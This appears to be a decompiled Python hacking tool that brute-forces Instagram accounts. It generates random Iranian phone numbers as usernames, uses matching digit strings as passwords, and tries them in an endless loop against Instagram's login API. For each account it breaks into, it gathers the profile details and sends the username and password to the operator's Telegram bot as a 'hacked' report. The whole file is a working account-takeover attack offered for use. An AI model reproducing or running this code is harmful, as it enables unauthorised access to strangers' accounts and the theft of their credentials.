# encoding: utf-8
# Decoded by HackerModePro tool...
# Copyright: PSH-TEAM
# Follow us on telegram ( @psh_team )
import pyfiglet
SSS = pyfiglet.figlet_format('M.S.A')
MMM = ('            Code By : MSA - @SQ21C')
print (SSS+MMM)
import os
MSA = 'MT'
pss=input("\033[1;37m [~]\033[1;35m𝗘𝗻𝘁𝗲𝗿 𝗽𝗮𝘀𝘀𝘄𝗼𝗿𝗱 :\033[1;33m")
if pss ==MSA:
 pass
 print("\033[1;32m          𝗬𝗼𝘂 𝗮𝗿𝗲 𝗹𝗼𝗴𝗴𝗲𝗱 𝗶𝗻 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆")
 
 os.system('clear')
else:
 exit('\033[1;31m             𝘄𝗿𝗼𝗻𝗴 𝗽𝗮𝘀𝘀𝘄𝗼𝗿𝗱 ')
import webbrowser 
webbrowser.open("https://t.me/sq21c")
import os
os.system('clear')
try:
    from time import sleep
    import webbrowser, random, requests
    from user_agent import generate_user_agent
    import json
    from secrets import token_hex
    import secrets, sys
except ImportError:
    os.system('pip install time')
    os.system('pip install webbrowser ')
    os.system('pip install random')
    os.system('pip install requests')
    os.system('pip install user_agent')
    os.system('pip install json')
    os.system('pip install secrets')
    os.system('pip install sys')
    os.system('clear')
    from time import sleep
    import time, webbrowser, random, requests
    from uuid import uuid4
    from user_agent import generate_user_agent
    import json
    from secrets import token_hex
    import secrets, sys
else:
    from time import sleep
    import webbrowser, random, requests
    from user_agent import generate_user_agent
    import json
    from secrets import token_hex
    import secrets, sys
    os.system('clear')
    
    aa = 0
    zz = 0
    E = '\x1b[1;31m'
    G = '\x1b[1;32m'
    S = '\x1b[1;33m'
    Z = '\x1b[1;31m'
    X = '\x1b[1;33m'
    Z1 = '\x1b[2;31m'
    F = '\x1b[2;32m'
    A = '\x1b[2;39m'
    C = '\x1b[2;35m'
    B = '\x1b[2;36m'
    Y = '\x1b[1;34m'
    import time
    timee = time.asctime()
    t = time.localtime()
    current_time = time.strftime('%H:%M:%S', t)

    def a(z):
        for e in z:
            sys.stdout.write(e)
            sys.stdout.flush()
            sleep(0.026)


    a(f"                    {Y} 𝐃𝐄𝐕  {G}: 𝐂𝐨𝐝𝐞 𝐁𝐲 : 𝐌𝐒𝐀 - @𝐒𝐐21𝐂 ")
    sleep(1)
    print('\n\n')
    a(G + ' \n\n𝐄𝐍𝐓𝐄𝐑 𝐘𝐎𝐔𝐑 𝐓𝐎𝐊𝐄𝐍  ')
    
    print('\n')
    tok = input(S + '     >> ' + C)
    sleep(2)
    os.system('clear')
    
    a(A + ' 𝐄𝐍𝐓𝐄𝐑 𝐘𝐎𝐔𝐑 𝐈𝐃  ')
    print('\n')
    ID = input(A + '     >> ' + C)
    sleep(0.1)
    os.system('clear')
    
 

    start_msg = requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=ᗯᗩITIᑎG ᖴOᖇ ᑕᕼEᑕKIᑎG 𖠱 ").json()
    id_msg = start_msg['result']['message_id']

    def code_joo(userQ, password):
        cookie = secrets.token_hex(8) * 2
        head = {'HOST':'www.instagram.com', 
         'KeepAlive':'True', 
         'user-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36', 
         'Cookie':cookie, 
         'Accept':'*/*', 
         'ContentType':'application/x-www-form-urlencoded', 
         'X-Requested-With':'XMLHttpRequest', 
         'X-IG-App-ID':'936619743392459', 
         'X-Instagram-AJAX':'missing', 
         'X-CSRFToken':'missing', 
         'Accept-Language':'en-US,en;q=0.9'}
        url_id = f"https://www.instagram.com/{userQ}/?__a=1"
        req_id = requests.get(url_id, headers=head).json()
        name = str(req_id['graphql']['user']['full_name'])
        id = str(req_id['graphql']['user']['id'])
        followes = str(req_id['graphql']['user']['edge_followed_by']['count'])
        following = str(req_id['graphql']['user']['edge_follow']['count'])
        re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
        ree = re.json()
        dat = ree['data']
        t = time.localtime()
        current_time = time.strftime('%H:%M:%S', t)
        joo3 = f"\n ✅‼️𝐈𝖓𝐬𝖙𝖆𝖌𝖗𝖆𝖒 𝖆𝖈𝖈𝖔𝖚𝖓𝖙  𝖍𝖆𝖈𝖐𝖊𝐝❔✅ \n\n\n ︎.<•>︎ ––––––––––––––––︎ <•>. \n .♻. .🌀.⌯𝗡𝐚𝐦𝐞 ➡️  : {name}\n ..⚡.⌯ 𝗨𝐬𝐞𝐫𝗡𝐚𝐦𝐞 : {userQ}\n ..🔑.⌯ 𝗽𝐚𝐬𝐬🆆𝐨𝐫𝐝  : {password}\n ..🔥.⌯𝖋𝖔𝖑𝖑𝖔𝖜𝖊𝖗𝒔 : {followes}\n ..⚡.⌯𝖋𝖔𝖑𝖑𝖔𝖜𝖎𝖓𝖌 : {following}\n ..🔎.𝐃𝖆𝖙𝖊 𝖈𝖗𝖊𝖆𝖙𝖊𝐝: {dat}\n ..⏰.TIⓂE: {current_time}\n .𝘁𝐡𝐢𝐬 𝐢𝐬 𝐭𝐡𝐞 𝐇𝐮𝐧𝐭 𝗡𝐮𝐦𝐛𝐞𝐫[{zz}] ✅🤤\n ︎.<•>︎ ––––––––––––––––︎ <•>.\n.𝗰𝖍𝖆𝖓𝖓𝖊𝖑 :@SQ21C ♦\n"
        tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=\n {joo3} \n"
        i = requests.post(tlg)
        print(G + joo3)


    url = 'https://b.i.instagram.com/api/v1/accounts/login/'
    headers = {'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)'}
    
    
    
    
                                                                                                                 
    while True:
        chars = '0987654321'
        u = '930','935'   
        u1 = str("". join(random.choice(chars)for i in range(7)))
        u2 = str("". join(random.choice(u)for i in range(1)))
        username = '+98'+u2+u1
        password = '0'+u2+u1
        from uuid import uuid4
        uid = str(uuid4())
        data = {'uuid':uid, 
         'password':password, 
         'username':username, 
         'device_id':uid, 
         'from_reg':'false', 
         '_csrftoken':'missing', 
         'login_attempt_countn':'0'}
        req = requests.post(url, headers=headers, data=data)
        if 'logged_in_user' in req.json():
            zz += 1
            userQ = req.json()['logged_in_user']['username']
            code_joo(userQ, password)
        elif '"message":"challenge_required","challenge"' in req.json():
            print(S + 'username S ==> : ' + username + ': password ==> : ' + password)
        else:
            requests.post(f"https://api.telegram.org/bot{tok}/editmessagetext?chat_id={ID}&message_id={id_msg}&text= 𝗪𝐚𝐢𝐭𝐢𝐧𝐠 𝐟𝐨𝐫 𝐜𝐡𝐞𝐜𝐤𝐢𝐧𝐠 ❉⇣                                        = = = = = = = = = = = = = = = = =\n\n \n->𝙱𝚈 :- 𝙼.𝚂.𝙰 \n√| @SQ21C |\n- \n\n\n- 𝗛 𝐈 𝐓 ✅ [{zz}]\n-\u200a 𝐜𝐡𝐞𝐜k̶𝐢𝐧𝐠🖤⚡️♛ֆ₎ [{aa}]")
            print(E + 'username ==> : ' + username + ': password ==> : ' + password)
            aa += 1
